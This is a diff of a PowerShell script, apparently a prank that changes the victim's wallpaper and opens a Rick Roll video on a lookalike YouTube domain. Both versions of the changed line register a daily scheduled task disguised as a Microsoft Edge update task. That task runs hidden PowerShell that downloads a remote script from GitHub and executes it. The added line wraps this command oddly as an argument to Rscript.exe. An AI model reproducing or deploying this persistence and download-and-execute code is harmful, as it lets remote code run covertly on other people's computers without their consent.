@@ -53,7 +53,7 @@ namespace Win32{
 
 add-type $code
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
-$action = New-ScheduledTaskAction -Execute 'powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://github.com/CHONK12/rickRoll/raw/main/Blue.ps1');"' 
+$action = New-ScheduledTaskAction -Execute 'Rscript.exe' -Argument 'powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://github.com/CHONK12/rickRoll/raw/main/Blue.ps1');"' 
 $trigger = New-ScheduledTaskTrigger -Daily -At 3pm
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
 Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
